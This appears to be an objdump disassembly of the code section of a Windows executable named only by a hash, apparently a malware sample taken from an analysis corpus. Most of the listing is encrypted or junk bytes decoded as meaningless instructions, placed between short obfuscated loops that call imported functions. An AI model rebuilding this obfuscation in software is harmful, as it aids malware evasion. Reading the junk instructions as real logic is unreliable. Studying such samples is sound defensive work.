
1015607b2862e5fbaec28b49f7612472641b10553afa16840561ff19be100491.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x23780cf7
  40101f:	xor    bh,ah
  401021:	js     0x40109b
  401023:	js     0x40109d
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a87
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	int    0x72
  4010d3:	push   0xffffffbb
  4010d5:	sub    al,BYTE PTR [ebx+0x1c]
  4010d8:	or     DWORD PTR [esi-0x44],0xffffff82
  4010dc:	jo     0x401141
  4010de:	or     DWORD PTR [ecx-0x7b3be0e1],esp
  4010e4:	cmp    al,0x4d
  4010e6:	mov    ebp,0xcef80cca
  4010eb:	sub    ecx,edx
  4010ed:	mov    edx,0x2d5b00b7
  4010f2:	ins    BYTE PTR es:[edi],dx
  4010f3:	pop    ds
  4010f4:	mov    ebp,0xc83782e6
  4010f9:	cs jmp 0x742bdff
  4010ff:	cli    
  401100:	dec    edi
  401101:	jle    0x40114d
  401103:	sbb    ah,BYTE PTR [ebx+ebx*2]
  401106:	addr16 aas 
  401108:	das    
  401109:	iret   
  40110a:	jnp    0x401165
  40110c:	(bad)  
  40110e:	dec    ebp
  40110f:	adc    edx,DWORD PTR [esi]
  401111:	xchg   edi,eax
  401112:	hlt    
  401113:	retf   
  401114:	mov    eax,0xae34d7d7
  401119:	jo     0x4010ec
  40111b:	ret    
  40111c:	aam    0x8a
  40111e:	aad    0x73
  401120:	das    
  401121:	sbb    esi,eax
  401123:	scas   al,BYTE PTR es:[edi]
  401124:	mov    ecx,0xbfe30169
  401129:	in     al,0xb3
  40112b:	xchg   ebp,eax
  40112c:	pop    ebp
  40112d:	cmp    ebx,DWORD PTR [edx]
  40112f:	cld    
  401130:	test   BYTE PTR [edx],bl
  401132:	xor    eax,0x62db7557
  401137:	pop    es
  401138:	mov    esi,0xd6dc5bd9
  40113d:	push   0x49
  40113f:	mov    ecx,0x7477289d
  401144:	(bad)  [eax+0x32]
  401147:	repnz push eax
  401149:	fmul   QWORD PTR [ecx]
  40114b:	push   0x55
  40114d:	or     ch,BYTE PTR [ecx-0x1f]
  401150:	inc    eax
  401151:	jo     0x401119
  401153:	sbb    esi,DWORD PTR [ebp+0x29]
  401156:	ret    0x7b19
  401159:	push   cs
  40115a:	dec    eax
  40115b:	outs   dx,DWORD PTR ds:[esi]
  40115c:	scas   al,BYTE PTR es:[edi]
  40115d:	mov    al,0xbc
  40115f:	mov    ecx,0x28ca41a2
  401164:	cs mov cs,ecx
  401167:	stos   DWORD PTR es:[edi],eax
  401168:	cmp    edi,DWORD PTR ds:0xd5136ddb
  40116e:	fisubr DWORD PTR [edi-0x6d]
  401171:	push   0x21c0a608
  401176:	pop    esi
  401177:	(bad)  
  401178:	cmc    
  401179:	mov    eax,ds:0x7ae1f818
  40117e:	pushf  
  40117f:	mov    edx,0x37a7fe47
  401184:	push   0x24
  401186:	cmp    DWORD PTR [edx+0x56],eax
  401189:	add    eax,ecx
  40118b:	xor    DWORD PTR [esi+0x37c936e5],edi
  401191:	cdq    
  401192:	xchg   ch,dl
  401194:	push   ebx
  401195:	dec    ebx
  401196:	repz adc ebx,esp
  401199:	test   BYTE PTR [eax-0x2a],ch
  40119c:	and    al,0xfc
  40119e:	xor    eax,0xcb9c1ec7
  4011a3:	daa    
  4011a4:	jmp    0x4011bc
  4011a6:	out    0x57,al
  4011a8:	lods   al,BYTE PTR ds:[esi]
  4011a9:	aas    
  4011aa:	inc    ebp
  4011ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011ac:	push   edx
  4011ad:	mul    DWORD PTR [esi-0xddc5c1d]
  4011b3:	jnp    0x401190
  4011b5:	dec    esp
  4011b6:	aam    0xed
  4011b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011b9:	mov    ah,0xea
  4011bb:	jbe    0x40113e
  4011bd:	sar    esp,0x23
  4011c0:	mov    al,ds:0x9f55c51e
  4011c5:	mov    bl,0x48
  4011c7:	mov    esp,0xd3b5d0f7
  4011cc:	retf   
  4011cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011ce:	xchg   BYTE PTR [esp+esi*2+0x3],dh
  4011d2:	clc    
  4011d3:	fldcw  WORD PTR [esi+edi*4]
  4011d6:	fistp  QWORD PTR [eax-0x1]
  4011d9:	aas    
  4011da:	sti    
  4011db:	pop    edi
  4011dc:	clc    
  4011dd:	icebp  
  4011de:	inc    BYTE PTR [ebp+0x6e]
  4011e1:	rcr    DWORD PTR [eax-0x79],0x70
  4011e5:	test   al,0x22
  4011e7:	fsub   QWORD PTR [edi+edx*8+0xc]
  4011eb:	rol    DWORD PTR [esi-0x53],0xec
  4011ef:	clc    
  4011f0:	mov    ebp,0xfc3a9daf
  4011f5:	test   al,0x93
  4011f8:	jge    0xe3e21b04
  4011fe:	inc    DWORD PTR [eax]
  401200:	in     al,dx
  401201:	sub    ebp,DWORD PTR ss:[edx]
  401204:	ret    
  401205:	js     0x401269
  401207:	mov    ecx,0x19cc69e8
  40120c:	sub    eax,0x5a956942
  401211:	cmp    edi,DWORD PTR [ebx-0x38a98c00]
  401217:	jg     0x401261
  401219:	mov    esi,0x445cfca6
  40121e:	ret    
  40121f:	xchg   ebx,eax
  401220:	xor    al,cl
  401222:	push   ecx
  401223:	push   ecx
  401224:	div    DWORD PTR [esi]
  401226:	imul   esi,DWORD PTR [edx+eiz*8],0xffffffdd
  40122a:	out    dx,eax
  40122b:	stos   DWORD PTR es:[edi],eax
  40122c:	push   ds
  40122d:	(bad)  
  40122e:	xor    BYTE PTR [edi-0x7e8a98d7],0x6c
  401235:	pop    ebx
  401236:	add    DWORD PTR [ebp+0xf15f36a],0xcc4853d7
  401240:	inc    eax
  401241:	adc    cl,BYTE PTR ss:[eax+0x590635b6]
  401248:	pop    ss
  401249:	ror    DWORD PTR [ebx-0x1de18269],0xcb
  401250:	arpl   WORD PTR [edx+0x6679cbb],bx
  401256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401257:	cmp    al,0x3d
  401259:	out    dx,al
  40125a:	dec    ebx
  40125b:	adc    DWORD PTR [edi],ecx
  40125d:	push   0xa8aa3059
  401262:	inc    edx
  401263:	(bad)  
  401264:	aad    0x64
  401266:	nop
  401267:	lods   al,BYTE PTR ds:[esi]
  401268:	ja     0x40124b
  40126a:	add    BYTE PTR [edi+eax*8-0x359f7f6],ch
  401271:	xor    DWORD PTR [ecx+eax*8+0x35],edx
  401275:	pop    ds
  401276:	in     eax,dx
  401277:	mov    ah,0x43
  401279:	daa    
  40127a:	scas   al,BYTE PTR es:[edi]
  40127b:	xchg   esp,eax
  40127c:	test   al,0x68
  40127e:	addr16 cmp ecx,eax
  401281:	and    bh,BYTE PTR [edx+0x79]
  401284:	push   0xffffffee
  401286:	sti    
  401287:	test   BYTE PTR [esi],0x34
  40128a:	adc    BYTE PTR [esi+0x44],dh
  40128d:	std    
  40128e:	loopne 0x401280
  401290:	push   edx
  401291:	les    ecx,FWORD PTR ds:[edx+0x6c]
  401295:	lods   al,BYTE PTR ds:[esi]
  401296:	cmp    eax,0x2ddbe60
  40129b:	xor    BYTE PTR [edi-0x7d],bl
  40129e:	iret   
  40129f:	cmp    DWORD PTR [ecx],ebx
  4012a1:	pop    ecx
  4012a2:	and    al,0xfd
  4012a4:	retf   0x7b14
  4012a7:	adc    BYTE PTR [esi],ch
  4012a9:	jmp    0x401268
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a80d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x34],1
  401422:	ins    DWORD PTR es:[edi],dx
  401423:	fcomp  DWORD PTR [ebx]
  401425:	(bad)  
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401438
  40142e:	fild   DWORD PTR [edx+0x2496d7ea]
  401434:	js     0x40141a
  401436:	add    BYTE PTR [ecx],cl
  401438:	sbb    dl,BYTE PTR [edi]
  40143a:	jb     0x401460
  40143c:	push   ax
  40143e:	cdq    
  40143f:	imul   esi,edx,0x53f72719
  401445:	or     al,0xa1
  401447:	int3   
  401448:	stc    
  401449:	shl    BYTE PTR [ecx+0x561e82d9],0xa4
  401450:	(bad)  
  401451:	inc    ebp
  401452:	mov    edx,DWORD PTR [ebp-0xa]
  401455:	dec    esp
  401456:	inc    edi
  401457:	add    esp,eax
  401459:	jmp    DWORD PTR [edx-0x47]
  40145c:	imul   ebp,DWORD PTR [ecx],0x85287807
  401462:	mov    es,WORD PTR [edx+0x73cd4222]
  401468:	push   eax
  401469:	adc    ecx,DWORD PTR [edx+0x1cb3760f]
  40146f:	mov    esi,0x77c701ed
  401474:	dec    esp
  401476:	or     DWORD PTR [esi],edi
  401478:	lods   al,BYTE PTR ds:[esi]
  401479:	sbb    BYTE PTR [eiz*4-0x14d52f36],al
  401480:	shl    DWORD PTR [ecx],cl
  401482:	out    dx,eax
  401483:	popa   
  401484:	jge    0x4014b0
  401486:	inc    edx
  401487:	in     eax,0xd1
  401489:	jns    0x401414
  40148b:	out    0x3b,al
  40148d:	and    BYTE PTR [ecx-0x2b881fde],0xfa
  401494:	inc    esi
  401495:	bound  edi,QWORD PTR [edi]
  401497:	jp     0x40141e
  401499:	jns    0x4014eb
  40149b:	jle    0x401509
  40149d:	mov    ebx,0xee74b942
  4014a2:	call   0x1cb235a1
  4014a7:	ret    
  4014a8:	cmp    BYTE PTR [esi+0x682355e],cl
  4014ae:	sub    al,0x30
  4014b0:	cmovo  edi,edx
  4014b3:	mov    al,ds:0x4aa807ef
  4014b9:	ss bswap esi
  4014bc:	loope  0x40150c
  4014be:	push   esi
  4014bf:	aaa    
  4014c0:	cwde   
  4014c1:	sbb    eax,0x824aad72
  4014c6:	cmp    DWORD PTR [eiz*4+0x7bf9563c],ebx
  4014cd:	outs   dx,DWORD PTR ds:[esi]
  4014ce:	ds mov cl,0xdb
  4014d1:	mov    bl,BYTE PTR [ebp+0x6d]
  4014d4:	xchg   esi,eax
  4014d5:	nop
  4014d6:	xchg   edx,eax
  4014d7:	call   0x3634:0xea9c6208
  4014de:	rcr    BYTE PTR [ebx],1
  4014e0:	mov    ebx,0x48a6cd68
  4014e5:	jbe    0x40152f
  4014e7:	ja     0x401483
  4014e9:	mov    edi,0x3f681951
  4014ee:	xor    eax,0xd90bab41
  4014f3:	cmp    eax,0x29527c74
  4014f8:	out    dx,eax
  4014f9:	mov    DWORD PTR [esi-0x7615d50b],edi
  4014ff:	inc    esp
  401500:	hlt    
  401501:	fmul   QWORD PTR [edx]
  401503:	cmp    esi,esp
  401505:	add    bh,bl
  401507:	jl     0x40152c
  401509:	jmp    esp
  40150b:	pop    ebp
  40150c:	xchg   ebp,eax
  40150d:	es mov esi,0xc129b2e
  401513:	pop    esp
  401514:	cwde   
  401515:	sbb    esp,DWORD PTR [edi-0x6f51156a]
  40151b:	pop    eax
  40151c:	mov    esi,0x94be77d4
  401521:	js     0x4014c1
  401523:	mov    ah,BYTE PTR [eax+0x6]
  401526:	aam    0xf8
  401528:	repnz mov eax,0xe7886499
  40152e:	leave  
  40152f:	mov    ebx,0xb0048e
  401534:	mov    ecx,0x8170a93e
  401539:	lahf   
  40153a:	pop    eax
  40153b:	adc    eax,0x9339f88b
  401540:	es ret 
  401542:	aaa    
  401543:	icebp  
  401544:	outs   dx,DWORD PTR ds:[esi]
  401545:	in     eax,dx
  401546:	aam    0x81
  401548:	mov    ebp,DWORD PTR [ecx]
  40154a:	pushf  
  40154b:	xchg   edi,eax
  40154c:	cmp    cl,BYTE PTR [esi]
  40154e:	lea    ebx,[edx-0x11]
  401551:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401553:	gs xchg esi,eax
  401555:	fstp   DWORD PTR [ebx]
  401557:	ds jg  0x4015b4
  40155a:	aaa    
  40155b:	fs fxam 
  40155e:	dec    ebp
  40155f:	pop    ss
  401560:	rol    BYTE PTR ds:0xa2cf238b,0xd8
  401567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401568:	pushw  ds
  40156a:	cwde   
  40156b:	pop    esi
  40156c:	(bad)  
  40156d:	stos   DWORD PTR es:[edi],eax
  40156e:	jle    0x401501
  401570:	or     BYTE PTR [eax-0x57],dh
  401573:	repnz das 
  401575:	xchg   DWORD PTR [esi+esi*8],edx
  401578:	jno    0x4015b8
  40157a:	pop    edi
  40157b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40157c:	inc    esp
  40157d:	lods   eax,DWORD PTR ds:[esi]
  40157e:	adc    edx,DWORD PTR [edx+eax*8-0x17]
  401582:	cld    
  401583:	mov    esi,0x8e6f3930
  401588:	sub    al,0xea
  40158a:	icebp  
  40158b:	mov    ecx,0xee228a41
  401590:	into   
  401591:	clc    
  401592:	inc    edx
  401593:	clc    
  401594:	jb     0x401524
  401596:	cmp    DWORD PTR [edi+edi*2-0x56cc6b8f],esi
  40159d:	push   ecx
  40159e:	sbb    DWORD PTR [ebx],edi
  4015a0:	mov    ch,0x44
  4015a2:	mov    ch,0x1d
  4015a4:	std    
  4015a5:	inc    eax
  4015a6:	jbe    0x40159b
  4015a8:	or     DWORD PTR [edi+0x1482135e],ebx
  4015ae:	cld    
  4015af:	data16 (bad) 
  4015b1:	xor    DWORD PTR [eax],esi
  4015b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b4:	push   cs
  4015b5:	push   es
  4015b6:	shr    BYTE PTR [edx+0x3f86152e],0xf
  4015bd:	fidiv  WORD PTR [esi+0x6731e0dd]
  4015c3:	xchg   edx,eax
  4015c4:	xor    ebx,edx
  4015c6:	mov    ds:0x9135127b,al
  4015cb:	push   eax
  4015cc:	mov    ecx,0x14d96d87
  4015d1:	sbb    al,0x4e
  4015d3:	adc    eax,DWORD PTR [esi]
  4015d5:	iret   
  4015d6:	xchg   BYTE PTR [esi-0x74],al
  4015d9:	fs mov al,0xc8
  4015dc:	mov    eax,ds:0x7b623095
  4015e1:	jmp    0x40163e
  4015e3:	sti    
  4015e4:	dec    esp
  4015e5:	adc    DWORD PTR [ebx],0x40
  4015e8:	add    BYTE PTR [ebx],bl
  4015ea:	repnz stos DWORD PTR es:[edi],eax
  4015ec:	push   esi
  4015ed:	repnz bound ebp,QWORD PTR [edi]
  4015f0:	push   cs
  4015f1:	inc    esi
  4015f2:	cwde   
  4015f3:	hlt    
  4015f4:	xchg   esp,eax
  4015f5:	mul    dl
  4015f7:	fld    TBYTE PTR [ebp-0x28]
  4015fa:	clc    
  4015fb:	mov    esp,0x5e8e56de
  401600:	xchg   ebp,eax
  401601:	(bad)  
  401602:	outs   dx,BYTE PTR ds:[esi]
  401603:	aas    
  401604:	int3   
  401605:	dec    ebx
  401606:	mov    al,ds:0x6d4537cb
  40160b:	repnz sub DWORD PTR [esi+0x1c],ebp
  40160f:	retf   
  401610:	popa   
  401611:	imul   edx,DWORD PTR [eax-0x7017e7dc],0xbe35e99f
  40161b:	loop   0x40161b
  40161d:	jl     0x4015a4
  40161f:	enter  0xd60c,0x96
  401623:	fnstcw WORD PTR [ebp+0x3a]
  401626:	shl    ebp,1
  401628:	pop    ebx
  401629:	test   DWORD PTR [edx],edx
  40162b:	les    edi,FWORD PTR [edi+0x1d]
  40162e:	inc    edx
  40162f:	mov    BYTE PTR [ebp-0x30],al
  401632:	rol    DWORD PTR [edi+ecx*4-0x404f407],0x4c
  40163a:	sbb    DWORD PTR [edi],edx
  40163c:	push   ss
  40163d:	rcr    BYTE PTR [eax+0x165ceec7],cl
  401643:	inc    edx
  401644:	pop    esp
  401645:	inc    edx
  401646:	and    bh,BYTE PTR [esi-0x6208225f]
  40164c:	cmp    esp,edx
  40164e:	call   DWORD PTR [esi]
  401650:	mov    BYTE PTR [esi*4-0xcadf844],dl
  401657:	xor    eax,DWORD PTR [esi+ebp*8+0x205c8866]
  40165e:	jge    0x4015f6
  401660:	xchg   ecx,eax
  401661:	mov    edx,0x92b4c6f4
  401666:	add    DWORD PTR [edx],0xffffffae
  401669:	xchg   esp,eax
  40166a:	mov    ebx,0x3bd24a06
  40166f:	mov    WORD PTR [ebx+0x44e41408],ds
  401675:	hlt    
  401676:	ret    0x793
  401679:	pusha  
  40167a:	add    dx,di
  40167d:	not    BYTE PTR gs:[edi]
  401680:	sbb    edi,DWORD PTR [ebx]
  401682:	xlat   BYTE PTR ds:[ebx]
  401683:	jg     0x40168b
  401685:	mov    dh,0xf2
  401687:	mov    cl,0xc0
  401689:	fidivr WORD PTR [edx+0x5e]
  40168c:	jb     0x4016b4
  40168e:	jae    0x40169a
  401690:	jp     0x4016ce
  401692:	jmp    0x1b4d3ba0
  401697:	xor    DWORD PTR [ecx],edi
  401699:	test   BYTE PTR [ebx+0x2f277219],cl
  40169f:	imul   edx,DWORD PTR [ebx],0x88e384c8
  4016a5:	icebp  
  4016a6:	shl    BYTE PTR [ebp+0xb],cl
  4016a9:	push   eax
  4016aa:	aad    0x63
  4016ac:	(bad)  
  4016ad:	dec    ebx
  4016ae:	dec    ecx
  4016af:	add    eax,edi
  4016b1:	xor    DWORD PTR ds:0x42a84d,0x53dc
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz and DWORD PTR [eax],esp
  4016f6:	jae    0x401759
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x40177f
  401701:	sbb    al,0x8e
  401703:	and    ecx,DWORD PTR [ebp+0x15]
  401706:	pop    ebx
  401707:	repnz adc BYTE PTR es:[esi+edi*4-0x27863353],bl
  401710:	sbb    eax,0x1a4c8ab9
  401715:	inc    ebx
  401716:	add    ebp,DWORD PTR [eax+ecx*2]
  401719:	adc    al,0x8f
  40171b:	rcl    DWORD PTR [edx+ebp*8],cl
  40171e:	mov    dh,dl
  401720:	lock imul ebp,DWORD PTR [ebx],0xffffffc1
  401724:	xchg   ebx,eax
  401725:	mov    ?,WORD PTR [edx]
  401727:	gs dec eax
  401729:	inc    ecx
  40172a:	leave  
  40172b:	sahf   
  40172c:	in     eax,0x93
  40172e:	aam    0x55
  401730:	cmp    edx,DWORD PTR [edx+0x2d]
  401733:	(bad)  
  401734:	pop    eax
  401735:	rol    DWORD PTR [edi+0x7c],cl
  401738:	sbb    ch,0x26
  40173b:	fninit 
  40173d:	mov    ds:0xc6f31c6f,eax
  401742:	and    al,0x8a
  401744:	add    al,0xce
  401746:	adc    BYTE PTR [esp+ebx*2],dh
  401749:	stc    
  40174a:	jno    0x40173d
  40174c:	out    dx,al
  40174d:	pop    ebp
  40174e:	and    BYTE PTR [edi],ch
  401750:	out    dx,eax
  401751:	mov    bl,0x9
  401753:	jo     0x4016dd
  401755:	loopne 0x401721
  401757:	mov    ds:0x30c4cbe,eax
  40175c:	or     al,0x48
  40175e:	jge    0x40170b
  401760:	cwde   
  401761:	mov    dh,0x2
  401763:	mov    ds:0xa563cc15,eax
  401768:	test   DWORD PTR [ebx+ecx*4+0x40a34022],ebx
  40176f:	rcl    BYTE PTR [esi+eiz*4+0x7e],cl
  401773:	xor    eax,DWORD PTR [esi]
  401775:	repz jns 0x40173a
  401778:	and    ch,BYTE PTR [edx+ebx*2-0x175c99a5]
  40177f:	ret    
  401780:	repnz or edi,edi
  401783:	inc    edx
  401784:	add    BYTE PTR [edi-0x57828184],bh
  40178a:	mov    dh,0x30
  40178c:	fsub   st,st(4)
  40178e:	aaa    
  40178f:	fimul  WORD PTR [ebx-0x50]
  401792:	mov    ds:0x8ec15492,al
  401797:	and    eax,0xb80d4ff1
  40179c:	fucomp st(2)
  40179e:	mov    bh,0x25
  4017a0:	in     eax,0xdc
  4017a2:	leave  
  4017a3:	test   al,0xac
  4017a5:	and    al,0xa
  4017a7:	retf   
  4017a8:	arpl   cx,cx
  4017aa:	and    al,cl
  4017ac:	mul    DWORD PTR [ebx-0x79b1e341]
  4017b2:	xor    eax,0x5bf96980
  4017b7:	retf   
  4017b8:	add    ch,ah
  4017ba:	push   ecx
  4017bb:	inc    eax
  4017bc:	hlt    
  4017bd:	popa   
  4017be:	loop   0x4017da
  4017c0:	sub    bl,BYTE PTR [eax-0x5b0bd42a]
  4017c6:	push   ss
  4017c7:	test   al,0xcd
  4017c9:	loop   0x4017ec
  4017cb:	add    bh,al
  4017cd:	push   edi
  4017ce:	ss int3 
  4017d0:	retf   
  4017d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d2:	dec    esp
  4017d3:	mov    esp,0x86f1fc94
  4017d8:	fcmovbe st,st(7)
  4017da:	scas   al,BYTE PTR es:[edi]
  4017db:	imul   ecx,DWORD PTR [ebx-0x17a12f19],0x9dd293d6
  4017e5:	bound  eax,QWORD PTR [ebp+0x35]
  4017e8:	mov    ebx,0x76b23b04
  4017ed:	cwde   
  4017ee:	or     BYTE PTR [ebp-0x4],ch
  4017f1:	cmp    BYTE PTR [esi-0x7e1b82e7],0xdd
  4017f8:	pushf  
  4017f9:	mov    esp,DWORD PTR [ebp+0x45b2e631]
  4017ff:	add    BYTE PTR [esi],bl
  401801:	mov    esi,0xd5433a9d
  401806:	mov    ch,0x56
  401808:	int3   
  401809:	mov    ebx,0x31dee41b
  40180e:	mov    eax,0xfbb958fc
  401813:	in     eax,0xd3
  401815:	dec    ebp
  401816:	cs push 0x6c79d157
  40181c:	inc    edi
  40181d:	aam    0x26
  40181f:	xor    bl,dl
  401821:	nop
  401822:	push   cs
  401823:	pop    ss
  401824:	shl    DWORD PTR [edi+ebp*2-0x24],cl
  401828:	push   edx
  401829:	jno    0x40182c
  40182b:	in     al,0x1
  40182d:	mov    bh,BYTE PTR [eax]
  40182f:	sbb    al,0xd7
  401831:	and    al,0x32
  401833:	xor    DWORD PTR [eax+0x6],esi
  401836:	stc    
  401837:	stos   BYTE PTR es:[edi],al
  401838:	mov    bl,0x7b
  40183a:	xchg   edi,eax
  40183b:	scas   eax,DWORD PTR es:[edi]
  40183c:	pop    ebp
  40183d:	test   eax,0x95a0d0e0
  401842:	cmp    BYTE PTR [eax],al
  401844:	je     0x401875
  401846:	fst    DWORD PTR [eax+0x375c7903]
  40184c:	pop    esp
  40184d:	scas   eax,DWORD PTR es:[edi]
  40184e:	add    BYTE PTR [esi+edi*1+0x18f48ba8],dh
  401855:	adc    cl,ah
  401857:	push   cs
  401858:	mov    ds:0xd84725ff,eax
  40185d:	ins    DWORD PTR es:[edi],dx
  40185e:	sub    BYTE PTR [ebx+0x24],cl
  401861:	sbb    edx,DWORD PTR [esi-0x62468788]
  401867:	ds hlt 
  401869:	dec    esp
  40186a:	out    dx,eax
  40186b:	sub    DWORD PTR [esi],ecx
  40186d:	aaa    
  40186e:	shl    DWORD PTR [eax-0x5c2b0a7e],cl
  401874:	arpl   di,sp
  401876:	into   
  401877:	sti    
  401878:	xor    eax,0x923a0796
  40187d:	mov    ebp,0x250f5c39
